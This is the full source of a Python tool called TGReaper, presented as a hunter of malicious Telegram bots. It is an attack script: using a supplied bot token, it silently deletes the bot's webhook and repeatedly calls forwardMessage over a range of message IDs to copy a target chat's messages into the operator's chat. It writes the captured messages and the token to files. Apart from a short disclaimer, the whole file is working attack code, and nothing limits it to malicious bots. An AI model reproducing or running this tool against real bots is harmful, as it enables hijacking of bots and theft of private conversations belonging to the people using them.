#!/usr/bin/env python3
"""
TGReaper - CLI Telegram Bot Hunter
A powerful tool to hunt down malicious Telegram bots
"""

import requests
import asyncio
import os
import threading
import time
import sys
from datetime import datetime
from telethon import TelegramClient
from dotenv import load_dotenv
import argparse

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BRIGHT_RED = '\033[1;91m'
    BRIGHT_GREEN = '\033[1;92m'
    BRIGHT_YELLOW = '\033[1;93m'
    BRIGHT_BLUE = '\033[1;94m'
    BRIGHT_MAGENTA = '\033[1;95m'
    BRIGHT_CYAN = '\033[1;96m'

def print_banner():
    """Display the TGReaper banner"""
    banner = f"""
{Colors.BRIGHT_RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠻⣥⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⡿⠻⣆⠙⠦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡄⠁⠀⠘⣆⡔⢶⣆⠉⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⡿⢿⡀⠉⠀⠞⠹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⡄⠀⡇⠘⣧⣀⣀⣀⠀⠻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠃⠁⢀⣠⠞⣹⢿⠻⡟⢿⣿⣯⢳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠃⠶⠒⠉⠁⣴⠇⢸⡇⡟⡷⢬⡙⠎⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠇⢀⣠⣄⡀⠚⠁⠀⠈⠀⠀⣷⠀⠉⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⣽⣿⣶⠋⢉⡿⠇⠀⠀⠀⠀⠀⣰⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⣿⣿⠇⠀⣠⣥⣤⡀⠀⠀⠀⢀⡟⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢿⣿⢀⣾⡟⠉⢹⡇⠀⠀⠀⢸⠁⡿⠙⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢸⣇⣾⡟⠀⠸⡏⣄⡀⠀⠀⢹⢀⡇⢀⢘⢿⣮⡙⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣇⠀⡀⣧⠰⣿⣶⣄⠀⠀⠀⠘⣎⠳⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡿⣿⣆⠹⣿⡐⣾⣷⣹⣆⠀⠀⠀⠘⢷⣄⣻⣿⣿⣷⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣿⣦⠽⣇⣹⣟⢿⠙⠁⠀⠀⠀⣤⠉⠻⣿⣿⣿⣿⣦⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠙⡟⠂⣿⢹⡿⣼⠇⠀⠀⣀⠀⣷⡀⠀⠈⠻⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡆⢻⠀⠉⢸⡇⠈⣀⣠⣾⠇⠀⠻⣿⣦⣤⣴⣿⠿⣿⡿⣷⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⢸⡀⠀⢸⠁⣰⠛⣽⡧⠖⠻⢿⡆⠈⠉⠉⠀⠀⢻⣷⠹⠇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠘⡇⠀⢸⢰⡏⢰⡟⠀⣀⣀⡼⠃⠀⢀⡆⠀⠀⠘⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣿⣶⣷⣶⣾⣿⣧⣾⣤⣄⣀⣀⣤⣤⣶⡿⠀⠀⠀⢠⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣟⡛⠛⠛⠉⠉⠉⠉⢉⣭⣽⡿⠿⠿⠿⠛⠛⠛⠓⠲⠦⠄⣼⢻⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢉⣼⣿⣿⠿⠛⠛⠁⠀⠀⣠⠖⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⣸⡇⠀
⠀⠀⠀⠀⠀⢀⣴⠿⠛⠁⢀⣀⣀⣀⣀⣀⣄⡀⠀⠀⠀⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠇⣰⣿⠁⠀
⠀⠀⠀⢀⣴⣟⣥⣶⣾⣿⣿⣿⣿⣿⣿⣭⣤⣤⣤⣀⣀⡀⠈⠛⠶⢶⣶⣶⣶⣾⣿⣿⣿⠟⠁⠀⠀
⠀⢀⣴⡿⠟⠋⡽⠟⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠙⠛⠛⠛⠿⠿⠿⠿⠟⠛⠉⠁⠀⠀⠀⠀
⠐⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{Colors.RESET}
                       👻 Stealth, Intelligence, and Tracking 👻

                                 💀 TGReaper 💀
     
                              👾 Version: 1.0.0 👾

                    🧑‍💻 Author: Sumit Shah (aka Ghostdinit) 🧑‍💻
"""
    print(banner)

def animate_text(text, color=Colors.GREEN, delay=0.05):
    """Animate text character by character"""
    for char in text:
        sys.stdout.write(color + char + Colors.RESET)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def loading_animation(text, duration=2):
    """Display loading animation"""
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end_time = time.time() + duration
    while time.time() < end_time:
        for char in chars:
            sys.stdout.write(f'\r{Colors.CYAN}{char} {text}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * (len(text) + 5) + '\r')
    sys.stdout.flush()

def print_success(message):
    """Print success message"""
    print(f"{Colors.BRIGHT_GREEN}✅ {message}{Colors.RESET}")

def print_error(message):
    """Print error message"""
    print(f"{Colors.BRIGHT_RED}❌ {message}{Colors.RESET}")

def print_warning(message):
    """Print warning message"""
    print(f"{Colors.BRIGHT_YELLOW}⚠️  {message}{Colors.RESET}")

def print_info(message):
    """Print info message"""
    print(f"{Colors.BRIGHT_BLUE}ℹ️  {message}{Colors.RESET}")

def print_log(message):
    """Print log message with timestamp"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"{Colors.CYAN}[{timestamp}]{Colors.RESET} {message}")

def print_help():
    """Display help information"""
    help_text = f"""
{Colors.BRIGHT_YELLOW}🔧 TGReaper Commands & Usage{Colors.RESET}

{Colors.BRIGHT_GREEN}Available Commands:{Colors.RESET}
  {Colors.CYAN}--help, -h{Colors.RESET}        Show this help message
  {Colors.CYAN}--version, -v{Colors.RESET}     Show version information
  {Colors.CYAN}--interactive, -i{Colors.RESET} Run in interactive mode

{Colors.BRIGHT_GREEN}Interactive Mode Features:{Colors.RESET}
  {Colors.YELLOW}1.{Colors.RESET} 🎯 Start Attack - Validate bot token and initiate infiltration
  {Colors.YELLOW}2.{Colors.RESET} 📨 Forward Messages - Forward all messages from target chat
  {Colors.YELLOW}3.{Colors.RESET} ⏹️  Stop Operation - Stop current forwarding operation
  {Colors.YELLOW}4.{Colors.RESET} ▶️  Resume Operation - Resume stopped operation
  {Colors.YELLOW}5.{Colors.RESET} 📁 Export Data - Export captured messages to file
  {Colors.YELLOW}6.{Colors.RESET} 🔄 Clear Logs - Clear current session logs
  {Colors.YELLOW}7.{Colors.RESET} ❓ Help - Show this help menu
  {Colors.YELLOW}8.{Colors.RESET} 🚪 Exit - Exit TGReaper

{Colors.BRIGHT_GREEN}Requirements:{Colors.RESET}
  • Valid Telegram API credentials (.env file)
  • Malicious bot token
  • Target chat ID

{Colors.BRIGHT_GREEN}Environment Variables (.env file):{Colors.RESET}
  {Colors.CYAN}TELEGRAM_API_ID{Colors.RESET}     - Your Telegram API ID
  {Colors.CYAN}TELEGRAM_API_HASH{Colors.RESET}   - Your Telegram API Hash
  {Colors.CYAN}TELEGRAM_PHONE{Colors.RESET}      - Your Telegram Phone Number

{Colors.BRIGHT_RED}⚠️  Legal Disclaimer:{Colors.RESET}
This tool is for educational and security research purposes only.
Use responsibly and only on systems you own or have permission to test.
"""
    print(help_text)

class TGReaper:
    def __init__(self):
        load_dotenv()
        
        # Load environment variables
        env_api_id = os.getenv("TELEGRAM_API_ID", "0")
        env_api_hash = os.getenv("TELEGRAM_API_HASH", "")
        env_phone_number = os.getenv("TELEGRAM_PHONE", "")
        
        self.api_id = int(env_api_id) if env_api_id.isdigit() else 0
        self.api_hash = env_api_hash
        self.phone_number = env_phone_number
        
        # Initialize Telegram client
        self.client = TelegramClient("tgreaper_session", self.api_id, self.api_hash, app_version="9.4.0")
        
        # Bot and operation variables
        self.bot_token = None
        self.bot_username = None
        self.my_chat_id = None
        self.last_message_id = None
        self.stop_flag = False
        self.stopped_id = 0
        self.max_older_attempts = 200
        self.session = requests.Session()
        self.captured_messages = []
        
        # API URL
        self.TELEGRAM_API_URL = "https://api.telegram.org/bot"
    
    def validate_env(self):
        """Validate environment variables"""
        if not self.api_id or not self.api_hash or not self.phone_number:
            print_error("Missing Telegram API credentials!")
            print_info("Please create a .env file with:")
            print(f"  {Colors.CYAN}TELEGRAM_API_ID{Colors.RESET}=your_api_id")
            print(f"  {Colors.CYAN}TELEGRAM_API_HASH{Colors.RESET}=your_api_hash")
            print(f"  {Colors.CYAN}TELEGRAM_PHONE{Colors.RESET}=your_phone_number")
            return False
        return True
    
    def get_user_input(self, prompt, color=Colors.CYAN):
        """Get user input with colored prompt"""
        return input(f"{color}{prompt}{Colors.RESET}")
    
    def parse_bot_token(self, raw_token):
        """Parse and clean bot token"""
        raw_token = raw_token.strip()
        if raw_token.lower().startswith("bot"):
            raw_token = raw_token[3:]
        return raw_token
    
    def get_me(self, bot_token):
        """Get bot information using getMe API"""
        # Clear any existing webhook
        webhook_info = requests.get(f"{self.TELEGRAM_API_URL}{bot_token}/getWebhookInfo").json()
        if webhook_info.get("ok") and webhook_info["result"].get("url"):
            requests.get(f"{self.TELEGRAM_API_URL}{bot_token}/deleteWebhook")
        
        url = f"{self.TELEGRAM_API_URL}{bot_token}/getMe"
        try:
            r = requests.get(url)
            data = r.json()
            if data.get("ok"):
                return data["result"]
            else:
                print_error(f"getMe API Error: {data}")
                return None
        except Exception as e:
            print_error(f"getMe Request Error: {e}")
            return None
    
    async def telethon_send_start(self, bot_username):
        """Send /start command to bot using Telethon"""
        try:
            await self.client.start(self.phone_number)
            print_success("Logged in with your Telegram account")
            if not bot_username.startswith("@"):
                bot_username = "@" + bot_username
            await self.client.send_message(bot_username, "/start")
            print_success(f"'/start' command sent to {bot_username}")
            await asyncio.sleep(2)
        except Exception as e:
            print_error(f"Failed to send /start command: {e}")
    
    def get_updates(self, bot_token):
        """Get bot updates to find chat ID"""
        url = f"{self.TELEGRAM_API_URL}{bot_token}/getUpdates"
        try:
            r = requests.get(url)
            data = r.json()
            if data.get("ok") and data["result"]:
                last_update = data["result"][-1]
                msg = last_update["message"]
                my_chat_id = msg["chat"]["id"]
                last_message_id = msg["message_id"]
                return my_chat_id, last_message_id
            else:
                print_error(f"getUpdates failed: {data}")
                return None, None
        except Exception as e:
            print_error(f"getUpdates error: {e}")
            return None, None
    
    def get_message_content(self, bot_token, chat_id, message_id):
        """Get message content by forwarding it"""
        url = f"{self.TELEGRAM_API_URL}{bot_token}/forwardMessage"
        payload = {
            "chat_id": self.my_chat_id,
            "from_chat_id": chat_id,
            "message_id": message_id
        }
        try:
            r = requests.post(url, json=payload)
            data = r.json()
            
            if data.get("ok"):
                message = data["result"]
                content = {
                    "message_id": message_id,
                    "chat_id": chat_id,
                    "date": message.get("date"),
                    "text": message.get("text", ""),
                    "caption": message.get("caption", ""),
                    "file_id": None
                }
                
                # Check for media files
                media_types = ["photo", "document", "video", "audio", "voice", "sticker"]
                for media_type in media_types:
                    if media_type in message:
                        if isinstance(message[media_type], list):
                            content["file_id"] = message[media_type][-1].get("file_id")
                        else:
                            content["file_id"] = message[media_type].get("file_id")
                        break
                
                return content
            return None
        except Exception as e:
            print_error(f"Failed to get message content for ID {message_id}: {e}")
            return None
    
    def save_message_to_file(self, chat_id, message_content):
        """Save captured message to file"""
        if not message_content:
            return False
        
        os.makedirs("captured_messages", exist_ok=True)
        safe_token = self.bot_token.split(":")[0] if self.bot_token else "unknown"
        filename = os.path.join("captured_messages", f"bot_{safe_token}_chat_{chat_id}_data.txt")
        
        # Create file header if it doesn't exist
        if not os.path.exists(filename):
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("=== TGReaper Captured Data ===\n")
                    f.write(f"Bot Token: {self.bot_token}\n")
                    f.write(f"Bot Username: @{self.bot_username}\n")
                    f.write(f"Chat ID: {chat_id}\n")
                    f.write(f"Capture Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("\n=== Captured Messages ===\n\n")
            except Exception as e:
                print_error(f"Failed to create file header: {e}")
                return False
        
        # Append message content
        try:
            with open(filename, "a", encoding="utf-8") as f:
                f.write(f"\n--- Message ID: {message_content['message_id']} ---\n")
                f.write(f"Date: {message_content['date']}\n")
                if message_content['text']:
                    f.write(f"Text: {message_content['text']}\n")
                if message_content['caption']:
                    f.write(f"Caption: {message_content['caption']}\n")
                if message_content['file_id']:
                    f.write(f"File ID: {message_content['file_id']}\n")
                f.write("----------------------------------------\n")
            return True
        except Exception as e:
            print_error(f"Failed to save message to file: {e}")
            return False
    
    def forward_message(self, bot_token, from_chat_id, to_chat_id, message_id):
        """Forward a single message"""
        url = f"{self.TELEGRAM_API_URL}{bot_token}/forwardMessage"
        payload = {
            "from_chat_id": from_chat_id,
            "chat_id": to_chat_id,
            "message_id": message_id
        }
        try:
            r = self.session.post(url, json=payload)
            data = r.json()
            if data.get("ok"):
                print_log(f"✅ Forwarded message ID {message_id}")
                
                # Save message content asynchronously
                message_content = self.get_message_content(bot_token, from_chat_id, message_id)
                if message_content:
                    self.save_message_to_file(from_chat_id, message_content)
                    self.captured_messages.append(message_content)
                
                return True
            else:
                print_log(f"⚠️ Failed to forward message ID {message_id}: {data}")
                return False
        except Exception as e:
            print_error(f"Forward error for message ID {message_id}: {e}")
            return False
    
    def start_attack(self, bot_token):
        """Start the attack process"""
        print_info("Starting attack process...")
        loading_animation("Validating bot token", 1)
        
        # Parse and validate bot token
        parsed_token = self.parse_bot_token(bot_token)
        info = self.get_me(parsed_token)
        
        if not info:
            print_error("Invalid bot token or getMe failed!")
            return False
        
        bot_username = info.get("username")
        if not bot_username:
            print_error("No username found in bot info!")
            return False
        
        print_success(f"Bot validated: @{bot_username}")
        self.bot_token = parsed_token
        self.bot_username = bot_username
        
        # Send /start command
        loading_animation("Sending /start command", 2)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(self.telethon_send_start(bot_username))
        
        # Get updates
        loading_animation("Getting bot updates", 1)
        my_id, last_id = self.get_updates(parsed_token)
        
        if not my_id or not last_id:
            print_error("Failed to get updates from bot!")
            return False
        
        self.my_chat_id = my_id
        self.last_message_id = last_id
        
        print_success("Attack initialized successfully!")
        print_info(f"Bot Username: @{bot_username}")
        print_info(f"Chat ID: {my_id}")
        print_info(f"Last Message ID: {last_id}")
        
        return True
    
    def infiltrate_chat(self, target_chat_id):
        """Infiltrate target chat by trying older message IDs"""
        print_info(f"Starting infiltration of chat ID: {target_chat_id}")
        
        if not self.last_message_id:
            self.last_message_id = 0
        
        start_id = self.last_message_id
        stop_id = max(1, self.last_message_id - self.max_older_attempts)
        
        print_info(f"Trying message IDs from {start_id} down to {stop_id}")
        
        found_messages = 0
        for test_id in range(start_id, stop_id - 1, -1):
            if self.stop_flag:
                print_warning("Infiltration stopped by user")
                break
            
            success = self.forward_message(self.bot_token, target_chat_id, self.my_chat_id, test_id)
            if success:
                found_messages += 1
                print_success(f"Message captured! ID: {test_id}")
            
            # Small delay to avoid rate limiting
            time.sleep(0.1)
        
        if found_messages > 0:
            print_success(f"Infiltration complete! Found {found_messages} messages")
        else:
            print_warning("No messages found in the specified range")
        
        return found_messages > 0
    
    def forward_all_messages(self, target_chat_id):
        """Forward all messages from target chat"""
        if not all([self.bot_token, self.bot_username, self.my_chat_id, self.last_message_id]):
            print_error("Attack must be started first!")
            return False
        
        print_info(f"Starting message forwarding from chat ID: {target_chat_id}")
        
        max_id = self.last_message_id
        success_count = 0
        
        for msg_id in range(1, max_id + 1):
            if self.stop_flag:
                self.stopped_id = msg_id
                print_warning(f"Forwarding stopped at message ID {msg_id}")
                break
            
            success = self.forward_message(self.bot_token, target_chat_id, self.my_chat_id, msg_id)
            if success:
                success_count += 1
            
            # Progress indicator
            if msg_id % 10 == 0:
                progress = (msg_id / max_id) * 100
                print_log(f"Progress: {progress:.1f}% ({msg_id}/{max_id})")
            
            # Small delay to avoid rate limiting
            time.sleep(0.1)
        
        if not self.stop_flag:
            print_success(f"Forwarding complete! Successfully forwarded {success_count} messages")
        else:
            print_warning(f"Forwarding stopped. {success_count} messages forwarded so far")
        
        return success_count
    
    def resume_forwarding(self, target_chat_id):
        """Resume forwarding from where it was stopped"""
        if not self.stopped_id:
            print_error("No stopped operation to resume!")
            return False
        
        print_info(f"Resuming forwarding from message ID {self.stopped_id + 1}")
        self.stop_flag = False
        
        max_id = self.last_message_id
        success_count = 0
        
        for msg_id in range(self.stopped_id + 1, max_id + 1):
            if self.stop_flag:
                self.stopped_id = msg_id
                print_warning(f"Forwarding stopped again at message ID {msg_id}")
                break
            
            success = self.forward_message(self.bot_token, target_chat_id, self.my_chat_id, msg_id)
            if success:
                success_count += 1
            
            # Progress indicator
            if msg_id % 10 == 0:
                progress = (msg_id / max_id) * 100
                print_log(f"Progress: {progress:.1f}% ({msg_id}/{max_id})")
            
            time.sleep(0.1)
        
        if not self.stop_flag:
            print_success(f"Resume complete! Successfully forwarded {success_count} additional messages")
        else:
            print_warning(f"Forwarding stopped again. {success_count} additional messages forwarded")
        
        return success_count
    
    def stop_operation(self):
        """Stop current operation"""
        self.stop_flag = True
        print_warning("Stop signal sent. Operation will stop after current message.")
    
    def export_captured_data(self):
        """Export captured messages summary"""
        if not self.captured_messages:
            print_warning("No messages captured yet!")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"tgreaper_export_{timestamp}.txt"
        
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("=== TGReaper Export ===\n")
                f.write(f"Export Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Bot Token: {self.bot_token}\n")
                f.write(f"Bot Username: @{self.bot_username}\n")
                f.write(f"Total Messages: {len(self.captured_messages)}\n")
                f.write("\n=== Messages Summary ===\n\n")
                
                for msg in self.captured_messages:
                    f.write(f"Message ID: {msg['message_id']}\n")
                    f.write(f"Chat ID: {msg['chat_id']}\n")
                    f.write(f"Date: {msg['date']}\n")
                    if msg['text']:
                        f.write(f"Text: {msg['text'][:100]}{'...' if len(msg['text']) > 100 else ''}\n")
                    if msg['caption']:
                        f.write(f"Caption: {msg['caption'][:100]}{'...' if len(msg['caption']) > 100 else ''}\n")
                    if msg['file_id']:
                        f.write(f"File ID: {msg['file_id']}\n")
                    f.write("-" * 50 + "\n")
            
            print_success(f"Data exported to: {filename}")
        except Exception as e:
            print_error(f"Failed to export data: {e}")
    
    def clear_logs(self):
        """Clear current session logs"""
        self.captured_messages.clear()
        print_success("Session logs cleared")
    
    def interactive_mode(self):
        """Run TGReaper in interactive mode"""
        print_banner()
        
        if not self.validate_env():
            return
        
        animate_text("🚀 Welcome to TGReaper Interactive Mode!", Colors.BRIGHT_GREEN)
        print()
        
        # Get bot token and chat ID
        bot_token = self.get_user_input("🎯 Enter malicious bot token: ")
        if not bot_token:
            print_error("Bot token is required!")
            return
        
        target_chat_id = self.get_user_input("📱 Enter malicious chat ID: ")
        if not target_chat_id:
            print_error("Chat ID is required!")
            return
        
        print()
        
        while True:
            print(f"\n{Colors.BRIGHT_MAGENTA}═══════════════════════════════════════════════════════════════{Colors.RESET}")
            print(f"{Colors.BRIGHT_YELLOW}🔧 TGReaper Menu{Colors.RESET}")
            print(f"{Colors.BRIGHT_MAGENTA}═══════════════════════════════════════════════════════════════{Colors.RESET}")
            print(f"{Colors.CYAN}1.{Colors.RESET} 🎯 Start Attack")
            print(f"{Colors.CYAN}2.{Colors.RESET} 📨 Forward All Messages")
            print(f"{Colors.CYAN}3.{Colors.RESET} ⏹️  Stop Operation")
            print(f"{Colors.CYAN}4.{Colors.RESET} ▶️  Resume Operation")
            print(f"{Colors.CYAN}5.{Colors.RESET} 📁 Export Captured Data")
            print(f"{Colors.CYAN}6.{Colors.RESET} 🔄 Clear Session Logs")
            print(f"{Colors.CYAN}7.{Colors.RESET} ❓ Help")
            print(f"{Colors.CYAN}8.{Colors.RESET} 🚪 Exit")
            print(f"{Colors.BRIGHT_MAGENTA}═══════════════════════════════════════════════════════════════{Colors.RESET}")
            
            choice = self.get_user_input("🎲 Select an option (1-8): ")
            
            if choice == "1":
                self.start_attack(bot_token)
                if self.bot_token:
                    self.infiltrate_chat(target_chat_id)
            
            elif choice == "2":
                self.forward_all_messages(target_chat_id)
            
            elif choice == "3":
                self.stop_operation()
            
            elif choice == "4":
                self.resume_forwarding(target_chat_id)
            
            elif choice == "5":
                self.export_captured_data()
            
            elif choice == "6":
                self.clear_logs()
            
            elif choice == "7":
                print_help()
            
            elif choice == "8":
                print_success("Thanks for using TGReaper! 👋")
                break
            
            else:
                print_error("Invalid choice! Please select 1-8.")
            
            input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="TGReaper - Hunt down malicious Telegram bots")
    parser.add_argument("--version", "-v", action="version", version="TGReaper v2.0")
    parser.add_argument("--interactive", "-i", action="store_true", help="Run in interactive mode")
    
    args = parser.parse_args()
    
    if args.interactive or len(sys.argv) == 1:
        reaper = TGReaper()
        reaper.interactive_mode()
    else:
        print_banner()
        print_help()

if __name__ == "__main__":
    main()
